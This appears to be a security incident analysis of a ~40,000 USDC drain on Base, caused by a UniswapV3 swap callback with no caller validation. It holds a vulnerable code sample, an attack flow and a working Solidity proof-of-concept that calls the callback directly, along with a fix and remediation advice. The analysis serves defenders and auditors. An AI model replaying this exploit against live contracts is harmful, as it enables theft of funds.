# 0x8d2e — UniswapV3 Swap Callback Missing Access Control Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-10 |
| **Protocol** | 0x8d2e (Anonymous Protocol) |
| **Chain** | Base |
| **Loss** | ~40,000 USDC |
| **Attacker** | [0x4efd5f0749b1b91afdcd2ecf464210db733150e0](https://basescan.org/address/0x4efd5f0749b1b91afdcd2ecf464210db733150e0) |
| **Attack Tx** | [0x6be0c4b5...](https://basescan.org/tx/0x6be0c4b5414883a933639c136971026977df4737b061f864a4a04e4bd7f07106) |
| **Vulnerable Contract** | [0x8d2Ef0d39A438C3601112AE21701819E13c41288](https://basescan.org/address/0x8d2Ef0d39A438C3601112AE21701819E13c41288) |
| **Root Cause** | `uniswapV3SwapCallback` function has no caller validation, allowing anyone to call it arbitrarily |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/0x8d2e_exp.sol) |

---

## 1. Vulnerability Overview

The victim contract `0x8d2e` implements the UniswapV3 swap callback function `uniswapV3SwapCallback`, but contains absolutely no access control logic to verify whether the calling address is an actual UniswapV3 pool. The attacker directly called this function while injecting their own address into the parameters, draining 40,000 USDC held by the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: no caller validation in callback function
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data  // ← attacker injects arbitrary address into data
) external {
    // Does not verify whether msg.sender is an actual UniswapV3 pool!
    (address token, address recipient) = abi.decode(data, (address, address));
    IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
}

// ✅ Fix: verify that the caller is a legitimate UniswapV3 pool
function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // Must verify that the address invoking this callback is an authorized UniswapV3 pool
    require(msg.sender == address(expectedPool), "unauthorized caller");
    ...
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: 0x8d2e_decompiled.sol
contract 0x8d2e {
    function uniswapV3SwapCallback(int256 a, int256 b, bytes calldata c) external {  // ❌ vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Check victim contract's USDC balance
  │         IERC20(USDC).balanceOf(VICTIM) = 40,000 USDC
  │
  ├─[2]─▶ Encode data: (USDC address, attacker address)
  │
  ├─[3]─▶ Directly call VICTIM.uniswapV3SwapCallback(balance, 0, data)
  │         └─ No access control → executes immediately
  │
  └─[4]─▶ VICTIM transfers 40,000 USDC to attacker
              └─ Completed in a single transaction
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public balanceLog {
    // [1] Query the victim contract's total USDC balance
    uint256 balance = IERC20(USDC_ADDR).balanceOf(VICTIM);

    // [2] Encode data: token = USDC, recipient = attacker (this)
    bytes memory data = abi.encode(USDC_ADDR, address(this));

    // [3] Directly call uniswapV3SwapCallback
    // This function should only be called by a UniswapV3 pool,
    // but due to missing access control, anyone can call it
    IVictim(VICTIM).uniswapV3SwapCallback(
        int256(balance),  // amount0Delta: amount to transfer
        0,                // amount1Delta: unused
        data              // recipient = attacker
    );
    // → VICTIM immediately transfers 40,000 USDC to the attacker
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Vector** | Direct call to UniswapV3 callback function |
| **Impact** | Full drain of all assets held by the contract |
| **CWE** | CWE-284: Improper Access Control |
| **DASP Classification** | Access Control |

## 6. Remediation Recommendations

1. **Validate callback function caller**: Always verify that `msg.sender` is a pre-registered UniswapV3 pool address.
2. **Validate callback data**: Additionally verify that the recipient address encoded in `data` is an authorized address.
3. **Use a lock mechanism**: Use a state variable indicating that a swap is in progress to prevent reentrancy and direct calls.
4. **Cache the UniswapV3 pool address**: Store the pool address at initialization and compare against it in the callback.

## 7. Key Takeaways

- UniswapV3 callback functions (`uniswapV3SwapCallback`, `uniswapV3MintCallback`, etc.) must always verify that the caller is an actual pool.
- The callback pattern becomes an entry point for arbitrary code execution if not implemented correctly.
- This vulnerability is one of the simplest yet most devastating — it allows full asset drainage in a single transaction with no flash loan required.